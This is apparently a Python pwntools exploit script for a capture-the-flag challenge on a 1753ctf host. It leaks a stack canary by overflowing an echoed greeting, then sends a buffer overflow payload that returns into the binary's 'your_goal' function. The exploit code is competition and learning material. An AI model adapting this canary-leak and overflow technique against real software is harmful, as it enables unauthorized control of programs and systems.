from pwn import *

gs = '''
b *main+341
b *main+387
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("leakcan-25b8ac0dd7fd.tcp.1753ctf.com", 8435)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recv()

io.send(cyclic(89))

io.recvuntil(b"Hello! " + cyclic(89))

leak_canary = u64(b"\x00" + io.recv(7))

print(hex(leak_canary))

io.recv()

payload = b"".join([
    cyclic(88),
    p64(leak_canary),
    b"B"*8,
    p64(elf.sym.your_goal)
])

io.send(payload)


io.interactive()